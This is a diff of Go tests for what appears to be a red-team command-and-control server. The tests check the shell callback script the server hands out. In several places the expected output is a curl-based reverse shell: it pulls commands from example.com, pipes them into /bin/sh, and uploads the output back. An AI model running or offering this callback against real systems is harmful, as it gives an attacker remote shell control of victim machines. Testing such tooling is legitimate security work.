@@ -5,7 +5,7 @@ package hsrv
  * Tests for script.go
  * By J. Stuart McMurray
  * Created 20240324
- * Last Modified 20250115
+ * Last Modified 20250612
  */
 
 import (
@@ -75,46 +75,14 @@ func TestLocalAddrContext(t *testing.T) {
 	}
 }
 
-// lisenPort returns s's listener's port.
-func listenPort(t *testing.T, s *Server) string {
-	wp, err := crstemplate.Port(s.l.Addr().String())
-	if nil != err {
-		t.Fatalf("Error getting server port: %s", err)
-	}
-	if "" == wp {
-		t.Fatalf("Server's listener's address had no port")
-	}
-	return wp
-}
-
-func TestListenPort(t *testing.T) {
-	_, _, _, s, _ := newTestServer(t)
-	a := s.l.Addr().String()
-	_, want, err := net.SplitHostPort(a)
-	if nil != err {
-		t.Fatalf("Error splitting %s into host and port: %s", a, err)
-	}
-	if "" == want {
-		t.Fatalf("Listener address had no port")
-	}
-
-	if got := listenPort(t, s); got != want {
-		t.Fatalf(
-			"listenPort returned wrong port:\n got: %s\nwant: %s",
-			got,
-			want,
-		)
-	}
-}
-
-func TestServerScriptHandler(t *testing.T) {
+func TestServerScriptHandler_NonDefaultPort(t *testing.T) {
 	cl, _, och, s, _ := newTestServer(t)
 	rr := httptest.NewRecorder()
 	rr.Body = new(bytes.Buffer)
 	s.scriptHandler(rr, httptest.NewRequestWithContext(
 		localAddrContext(s),
 		http.MethodGet,
-		"/c",
+		"https://example.com:1234/c",
 		nil,
 	))
 	if http.StatusOK != rr.Code {
@@ -132,7 +100,7 @@ func TestServerScriptHandler(t *testing.T) {
 	wantLog := opshell.CLine{
 		Color: ScriptColor,
 		Line: "[192.0.2.1] Sent script: ID:IDID " +
-			"C2Addr:example.com:" + listenPort(t, s) + " Path:/c",
+			"C2Addr:example.com:1234 Path:/c",
 	}
 	if gotLog != wantLog {
 		t.Errorf(
@@ -143,14 +111,69 @@ func TestServerScriptHandler(t *testing.T) {
 	}
 
 	/* Make sure the template came out ok, too. */
-	wantBody := fmt.Sprintf(
-		`#!/bin/sh
-curl -sk --pinnedpubkey sha256//xxx= https://example.com:%s/i/IDID -N  </dev/null 2>&0 |
+	wantBody := `#!/bin/sh
+curl -sk --pinnedpubkey sha256//xxx= https://example.com:1234/i/IDID -N  </dev/null 2>&0 |
 /bin/sh 2>&1 |
-curl -sk --pinnedpubkey sha256//xxx= https://example.com:%[1]s/o/IDID -T- >/dev/null 2>&1
-`,
-		listenPort(t, s),
-	)
+curl -sk --pinnedpubkey sha256//xxx= https://example.com:1234/o/IDID -T- >/dev/null 2>&1
+`
+	gotBody := rr.Body.String()
+	gotBody = strings.ReplaceAll(gotBody, id, "IDID") /* Remove ID */
+	gotBody = regexp.MustCompile(                     /* Remove hash */
+		`sha256//[0-9A-z+/]{43}=`,
+	).ReplaceAllString(gotBody, `sha256//xxx=`)
+	if gotBody != wantBody {
+		t.Errorf(
+			"Incorrect body:\n"+
+				" got:\n%s\n"+
+				"want:\n%s",
+			gotBody,
+			wantBody,
+		)
+	}
+	cl.ExpectEmpty(t)
+}
+
+func TestServerScriptHandler(t *testing.T) {
+	cl, _, och, s, _ := newTestServer(t)
+	rr := httptest.NewRecorder()
+	rr.Body = new(bytes.Buffer)
+	s.scriptHandler(rr, httptest.NewRequestWithContext(
+		localAddrContext(s),
+		http.MethodGet,
+		"https://example.com/c",
+		nil,
+	))
+	if http.StatusOK != rr.Code {
+		t.Errorf("Non-OK Code %d", rr.Code)
+	}
+
+	/* Work out the ID and make sure the log is correct. */
+	gotLog := <-och
+	ms := regexp.MustCompile(` ID:(\S+) `).FindStringSubmatch(gotLog.Line)
+	if 2 != len(ms) {
+		t.Fatalf("Could not find ID in log line %q", gotLog.Line)
+	}
+	id := ms[1]
+	gotLog.Line = strings.ReplaceAll(gotLog.Line, id, "IDID")
+	wantLog := opshell.CLine{
+		Color: ScriptColor,
+		Line: "[192.0.2.1] Sent script: ID:IDID " +
+			"C2Addr:example.com:443 Path:/c",
+	}
+	if gotLog != wantLog {
+		t.Errorf(
+			"Incorrect log message:\n got: %#v\nwant: %#v",
+			gotLog,
+			wantLog,
+		)
+	}
+
+	/* Make sure the template came out ok, too. */
+	wantBody := `#!/bin/sh
+curl -sk --pinnedpubkey sha256//xxx= https://example.com/i/IDID -N  </dev/null 2>&0 |
+/bin/sh 2>&1 |
+curl -sk --pinnedpubkey sha256//xxx= https://example.com/o/IDID -T- >/dev/null 2>&1
+`
 	gotBody := rr.Body.String()
 	gotBody = strings.ReplaceAll(gotBody, id, "IDID") /* Remove ID */
 	gotBody = regexp.MustCompile(                     /* Remove hash */
@@ -311,7 +334,7 @@ func TestServerScriptHandler_FromFile(t *testing.T) {
 		); nil != err {
 			t.Fatalf("Error writing template to %s: %s", fn, err)
 		}
-		want = "templatey kittens: example.com:" + listenPort(t, s)
+		want = "templatey kittens: example.com:443"
 		f(t, http.StatusOK)
 	})
 
@@ -541,20 +564,19 @@ func TestServer_IncorrectSubtemplates(t *testing.T) {
 // s is used to get the listen port.
 func checkDefaultCallbackScript(t *testing.T, s *Server, got string) {
 	/* Make sure the template came out ok, too. */
-	wantF := `#!/bin/sh
-curl -sk --pinnedpubkey sha256//xxx= https://example.com:%s/i/zzz -N  </dev/null 2>&0 |
+	want := `#!/bin/sh
+curl -sk --pinnedpubkey sha256//xxx= https://example.com/i/zzz -N  </dev/null 2>&0 |
 /bin/sh 2>&1 |
-curl -sk --pinnedpubkey sha256//xxx= https://example.com:%[1]s/o/zzz -T- >/dev/null 2>&1
+curl -sk --pinnedpubkey sha256//xxx= https://example.com/o/zzz -T- >/dev/null 2>&1
 `
-	want := fmt.Sprintf(wantF, listenPort(t, s))
 
 	/* Replace unreliable bits with dummy values. */
 	got = regexp.MustCompile( /* Remove hash. */
 		`sha256//[0-9A-z+/]{43}=`,
 	).ReplaceAllString(got, `sha256//xxx=`)
 	got = regexp.MustCompile( /* Remove random ID. */
-		`https://example.com:(\d+)/(i|o)/\S+`,
-	).ReplaceAllString(got, `https://example.com:$1/$2/zzz`)
+		`https://example.com/(i|o)/\S+`,
+	).ReplaceAllString(got, `https://example.com/$1/zzz`)
 
 	/* See if it looks right. */
 	if want != got {
